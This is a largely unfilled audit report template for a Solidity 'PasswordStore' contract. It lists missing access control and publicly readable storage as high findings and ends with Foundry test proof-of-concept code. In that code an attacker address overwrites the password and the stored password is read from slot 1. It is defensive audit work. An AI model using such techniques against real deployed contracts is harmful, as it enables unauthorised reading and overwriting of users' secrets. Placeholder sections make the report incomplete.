---
title: Password Store Contract Audit Report
author: Daryle Tan
date: Oct 22, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

<!-- Your report starts here! -->

Prepared by: [Daryle Tan](https://daryle-tan.netlify.app/)

Lead Auditors: Daryle Tan

- xxxxxxx

# Table of Contents

- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

Protocol does X, Y, Z

# Disclaimer

The Daryle Tan team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details

## Scopes

## Roles

# Executive Summary

## Issues found

# Findings

lacking-access-control
anyone-can-read-storage

# High

lacking-access-control

anyone-can-read-storage

# Medium

# Low

Password not initialized in constructor

# Informational

# Gas

# POC

```solidity
    function test_missing_owner_check() public {
        // owner can set password
        vm.startPrank(owner);
        string memory expectedPassword1 = "myNewPassword";
        passwordStore.setPassword(expectedPassword1);
        string memory actualPassword1 = passwordStore.getPassword();
        assertEq(actualPassword1, expectedPassword1);
        vm.stopPrank();

        // attacker can also set password
        vm.startPrank(attacker);
        string memory expectedPassword2 = "attackerPassword";
        passwordStore.setPassword(expectedPassword2);
        vm.stopPrank();

        vm.startPrank(owner);
        string memory actualPassword2 = passwordStore.getPassword();
        assertEq(actualPassword2, expectedPassword2);
        vm.stopPrank();
    }

    // Create test to have non owner read the password variable
    function test_contract_memory_read() public view {
        bytes32 password = vm.load(address(passwordStore), bytes32(uint256(1)));
        console.logString(string(abi.encodePacked(password)));
    }
```
